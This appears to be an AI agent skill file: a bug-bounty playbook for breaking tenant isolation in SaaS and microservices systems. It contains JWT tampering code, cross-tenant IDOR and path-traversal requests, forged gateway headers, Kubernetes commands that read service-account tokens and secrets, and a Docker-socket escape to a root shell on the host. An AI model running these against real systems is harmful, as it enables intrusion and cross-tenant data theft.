---
name: hunt-tenant-isolation
description: Multi-tenant isolation bypass and microservices trust boundary exploitation — horizontal tenant escape, internal service-to-service trust abuse, JWT tenant claim manipulation, namespace escape in shared infrastructure, API gateway bypass via internal routing. Use on SaaS/multi-tenant targets and microservices architectures.
tags: [tenant, isolation, multi-tenant, microservices, saas, trust-boundary, namespace, jwt-tenant, internal-api]
version: 1.0.0
license: MIT
triggers: [hunt, tenant, isolation, multi-tenant, microservices, saas, trust-boundary, namespace, jwt-tenant, internal-api]
---

# Tenant Isolation Bypass & Microservices Trust Exploitation

## 1. MULTI-TENANT ARCHITECTURE ATTACK SURFACE

### Tenant Identification Points
```
Tenant is identified via:
1. Subdomain: tenant1.saas.com, tenant2.saas.com
2. Path prefix: saas.com/tenant1/api, saas.com/t/tenant2
3. HTTP header: X-Tenant-ID, X-Org-ID, X-Workspace-ID
4. JWT claim: {"org_id": "tenant1", "workspace": "acme"}
5. Cookie: tenant_id=123
6. Request body: {"organization_id": "uuid"}

Attack surface: Can I access TENANT_B's data while authenticated as TENANT_A?
```

---

## 2. JWT TENANT CLAIM MANIPULATION

### Decode and Modify Tenant Claims
```python
import jwt, base64, json

def decode_jwt_insecure(token):
    """Decode JWT without verification to inspect claims"""
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return payload

# Common tenant claims to manipulate
tenant_claims = [
    'org_id', 'organization_id', 'workspace_id', 'tenant_id',
    'account_id', 'company_id', 'team_id', 'group_id',
    'tenant', 'org', 'workspace', 'account', 'customer_id'
]

def test_tenant_claim_manipulation(token, target_tenant_id):
    """Check if server validates tenant from JWT or trusts client-supplied value"""
    payload = decode_jwt_insecure(token)
    
    for claim in tenant_claims:
        if claim in payload:
            print(f"Found tenant claim: {claim}={payload[claim]}")
            print(f"Try modifying to: {target_tenant_id}")
            
            # If JWT is unsigned or uses alg:none → modify directly
            # If RS256 → try HS256 confusion attack
            # If HS256 with weak secret → brute force
```

### Tenant in URL Path vs JWT Mismatch
```
Scenario: JWT says org_id=ACME, URL says /api/orgs/EVIL/data

Test:
1. Log into ACME org, get JWT
2. Request: GET /api/orgs/EVIL/data
   Authorization: Bearer <ACME_JWT>
   
3. Does server check org_id from JWT against URL param?
4. If not → cross-tenant access = IDOR at tenant level

Real example:
GET /api/v1/organizations/EVIL_ORG_UUID/users
Authorization: Bearer <MY_ORG_JWT>

→ Returns EVIL_ORG users → Critical IDOR
```

---

## 3. HORIZONTAL TENANT ESCAPE

### Shared Database with Tenant Filtering
```
Pattern: SELECT * FROM data WHERE tenant_id = ? AND id = ?
Attack: If tenant_id comes from user input and is trusted:

# Direct parameter injection
GET /api/data/123?tenant=VICTIM_TENANT

# If tenant from JWT but JWT not validated per-request:
POST /api/bulk-export
{"tenant_id": "VICTIM_TENANT_UUID", "format": "csv"}

# Second-order: register tenant_id that matches victim
# Create account with tenant_id=VICTIM_UUID (if not server-assigned)
```

### Shared File Storage
```bash
# Check if file paths include tenant isolation
# Typical: /uploads/{tenant_id}/{user_id}/{filename}
# Attack: path traversal across tenant boundary

GET /api/files/download?path=../VICTIM_TENANT_UUID/private/data.csv
GET /api/files/download?path=%2E%2E%2FVICTIM_TENANT%2Fdata.csv

# Or if tenant comes from token only, but file path doesn't include tenant:
GET /api/files/123  # Does this check tenant ownership?

# Test: Upload file as TENANT_A, get file ID
# Then request same file ID authenticated as TENANT_B
```

### Shared Cache with Tenant Keys
```
Cache key: tenant:{tenant_id}:user:{user_id}:profile
If tenant_id not properly isolated in cache key:

Attack 1: Cache poisoning across tenants
Response for VICTIM_TENANT cached without tenant isolation
→ ATTACKER_TENANT sees victim's cached response

Attack 2: Cache key collision
If cache key = MD5(user_id) without tenant:
ATTACKER user_id=123 → same cache as VICTIM user_id=123

Test: Create two accounts in different tenants with similar IDs
Request same endpoint — do you get each other's cached data?
```

---

## 4. MICROSERVICES TRUST BOUNDARY EXPLOITATION

### Internal Service-to-Service Trust
```
Microservices often have:
1. No auth between internal services (trusted network assumption)
2. Different auth for internal vs external
3. Internal endpoints accessible via SSRF

Attack via SSRF:
STEP 1: Find SSRF in public-facing service
STEP 2: Probe internal services
  http://user-service.internal/api/admin/users
  http://billing-service.internal/api/invoices
  http://auth-service.internal/api/tokens/create
  
STEP 3: Internal service has no JWT validation (trusts "internal" requests)
STEP 4: Full admin access without authentication
```

### JWT Audience (aud) Bypass
```python
# Service A trusts tokens with aud="service-a"
# Service B trusts tokens with aud="service-b"
# If Service B accepts aud="service-a" tokens:

# You have token for Service A with high privileges
# Test it against Service B endpoints

import jwt
token = "your_service_a_token"
payload = jwt.decode(token, options={"verify_signature": False})
print(f"Current aud: {payload.get('aud')}")
# If Service B doesn't validate aud → privilege confusion
```

### Service Mesh / Istio Bypass
```
Istio/Linkerd: mTLS between services, RBAC policies
But: Often misconfigured

Test:
1. Find service that doesn't require mTLS (check Istio PeerAuthentication)
2. Access internal service directly bypassing mesh
3. Or: Find service account token with excessive permissions

kubectl get peerauthentication --all-namespaces | grep PERMISSIVE
# PERMISSIVE mode = mTLS optional = bypass possible
```

### GraphQL Federation Trust
```
In GraphQL federation (Apollo):
- Gateway validates auth
- Subgraph services may NOT re-validate
- Direct subgraph access (bypassing gateway) = unauthenticated access

Test:
1. Find subgraph URLs (often exposed, dev/staging)
   /api/products-service/graphql (direct subgraph)
   /graphql (gateway)
   
2. Query subgraph directly without auth
   POST http://products-service.internal:4001/graphql
   {"query": "{ allProducts { id price secretCostPrice } }"}
   
3. If subgraph trusts gateway headers:
   POST /graphql
   x-hasura-user-id: admin
   x-hasura-role: admin
   # Inject trusted internal headers directly
```

---

## 5. NAMESPACE / CONTAINER ISOLATION BYPASS

### Kubernetes Multi-Tenant
```bash
# If you have ANY pod access (via RCE, SSRF to kubelet, etc.):

# Check current service account permissions
kubectl auth can-i --list

# Try to access other namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# Common misconfigs:
# 1. ClusterRole bound to namespace service account
kubectl get clusterrolebinding | grep <namespace>

# 2. Host PID/network sharing
# Check pod spec: hostPID: true → can see all processes on node

# 3. Privileged container → node escape
# cat /proc/1/cgroup → if no docker in path → already on host

# 4. Service account token with cluster-admin
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Test with kubectl using this token

# 5. RBAC wildcard
# "verbs": ["*"] or "resources": ["*"] = full access
```

### Docker Escape via Mounted Socket
```bash
# Check if Docker socket is mounted
ls -la /var/run/docker.sock

# If yes → escape to host
docker -H unix:///var/run/docker.sock run -it --rm \
  -v /:/mnt --privileged alpine chroot /mnt sh
# Now you're root on the host
```

---

## 6. API GATEWAY BYPASS

### Direct Backend Access
```bash
# API Gateway sits in front of backend
# If you can find backend directly:
# 1. Scan for exposed internal ports
# 2. Check DNS for internal service names
# 3. SSRF to probe internal URLs

# Common backend URL patterns:
# https://api.target.com → gateway
# https://api-internal.target.com → direct (may lack auth)
# http://10.0.0.50:8080 → direct backend

# Test: Does backend validate JWT? Or does gateway strip auth?
curl https://api-backend.target.com/api/admin/users
# If 200 without auth → gateway bypass
```

### Gateway Header Injection
```http
# API Gateway adds trusted headers to backend requests
# Test if you can inject these headers directly

GET /api/internal/admin HTTP/1.1
Host: api.target.com
X-Internal-Service: gateway
X-Forwarded-User: admin
X-User-Role: superadmin
X-Bypass-Auth: true
X-Real-IP: 127.0.0.1
X-Service-Auth: internal-service-key-guess

# Some gateways pass through unknown headers
# If backend trusts X-User-Role without validation → privilege escalation
```

### Rate Limit Bypass via Gateway Confusion
```
If API gateway has rate limit but backend does not:
1. Find direct backend URL (no gateway)
2. Unlimited requests directly
3. Or: Find secondary gateway/ALB endpoint

Alternative: X-Forwarded-For rotation
If gateway rate limits by source IP and trusts X-Forwarded-For:
X-Forwarded-For: <rotate IPs> → effectively unlimited requests
```

---

## 7. TENANT ISOLATION TEST CHECKLIST

```
[ ] JWT tenant claim → does server validate it's the right tenant?
[ ] URL tenant param → does server validate against JWT?
[ ] IDOR across tenants → access other tenant's object IDs
[ ] File storage → cross-tenant file access via path manipulation
[ ] Cache → cross-tenant cache poisoning/collision
[ ] Internal APIs → accessible via SSRF without tenant auth
[ ] GraphQL → subgraph direct access without gateway auth
[ ] Shared background jobs → do jobs leak cross-tenant data?
[ ] Admin endpoints → per-tenant admin vs global admin?
[ ] Webhooks → do webhook deliveries validate tenant ownership?
[ ] Export functions → does bulk export scope to correct tenant?
[ ] Search → does full-text search scope to tenant?
[ ] Audit logs → can I view another tenant's audit logs?
[ ] Billing → can I view/modify another tenant's billing data?
[ ] SSO → can I log in to another tenant with my credentials?
```

---

## PAID BOUNTY EXAMPLES

| Target | Vuln | Payout |
|--------|------|--------|
| Shopify | Tenant IDOR via merchant_id param | $50,000 |
| Slack | Cross-workspace message access | $20,000 |
| Atlassian | JIRA cross-tenant project access | $15,000 |
| Salesforce | Multi-tenant data isolation bypass | $25,000 |
| Zendesk | Cross-account ticket access | $10,000 |
| HubSpot | Portal isolation bypass via API | $8,000 |
| Twilio | Account isolation bypass via SSRF | $12,000 |
